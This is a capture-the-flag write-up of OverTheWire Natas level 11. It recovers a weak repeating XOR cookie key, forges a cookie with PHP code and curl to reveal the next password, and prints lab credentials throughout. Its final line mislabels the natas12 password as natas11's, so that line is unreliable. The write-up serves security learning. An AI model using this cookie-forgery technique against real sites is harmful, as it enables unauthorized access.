---
title: "Natas 11 - XOR cookie forgery"
date: 2026-04-10T16:25:37-05:00
draft: false
aliases:
  - /posts/natas/natas-11/

toc: false
images:
tags:
  - security
  - natas
  - overthewire
  - curl
---

- **Username:** `natas11`
- **Password:** `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`
- **URL:** <http://natas11.natas.labs.overthewire.org>

```bash
curl -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk http://natas11.natas.labs.overthewire.org/
```

Body:

```html
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>


<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

As usual, inspect `index-source.html`.

```bash
curl -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk http://natas11.natas.labs.overthewire.org/index-source.html
```

```php
<?

$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

Let's not skim, fully understand the functions before trying the next step.

Firstly, by far the most important factor in this code is the structure of how the array is plain text, `$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");` we know exactly how to manipulate it without guessing or external work.

The `xor_encrypt` function is self explanatory, it iterates through each characters to encrypt

`loadData` / `tempdata` is where the real work is: it decodes the cookie in a fixed order (base64 🠞 XOR 🠞 JSON), so we can walk it backwards.

`saveData` is the function that creates the cookie which is
> text > json > xor_encrypt > base64

And ignoring some functions since its for background colors, the last if statement we need `showpassword` to equal yes to get our next password.

Now that we know the bare basics, we can grab the cookie and work toward the real `$key` in `xor_encrypt`, then forge a payload with `showpassword` set how we want.

We can use the arg `curl -c - '<website>'` to give us the cookie.

```bash
curl -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -c - http://natas11.natas.labs.overthewire.org/
```

```text
natas11.natas.labs.overthewire.org      FALSE   /       FALSE   0 data     HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
```

Grab the `data` value from that jar line (URL-decode it so `%3D` becomes `=`). Copy the `xor_encrypt` loop from the source.

```php
<?

function xor_encrypt($in) {
    $key = base64_decode('HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=');
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$data = array("showpassword"=>"no", "bgcolor"=>"#ffffff");

print xor_encrypt(json_encode($data));
```

You should see something like `eDWoeDWoeDWoeDWo…` that's the key material repeating, so the actual key is `eDWo`. Then tweak the script: use that string as `$key`, set `"showpassword" => "yes"`, and run the same pipeline as `saveData` (JSON 🠞 XOR 🠞 base64) to create a new cookie.

> Because XOR is symmetric and the server effectively did `ciphertext = plaintext ^ key`, XORing **plaintext** with **ciphertext** gives you the keystream, which repeats the real key (shows up like `eDWoeDWoeDWo…` 🠞 the key is `eDWo`).

```php
<?

function xor_encrypt($in) {
    $key = 'eDWo';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$data = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");

# $cookieDecrypt = json_decode(xor_encrypt(base64_decode($data)));
# echo $cookieDecrypt;

print base64_encode(xor_encrypt(json_encode($data)));


```

That prints the forged `data` value, e.g. `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5` (yours may differ slightly depending on exact JSON).

Send it as the cookie and you get the next level's password:

```bash
curl -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -b 'data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5' http://natas11.natas.labs.overthewire.org/
```

Body:

```html
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

**Password for natas11:** `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`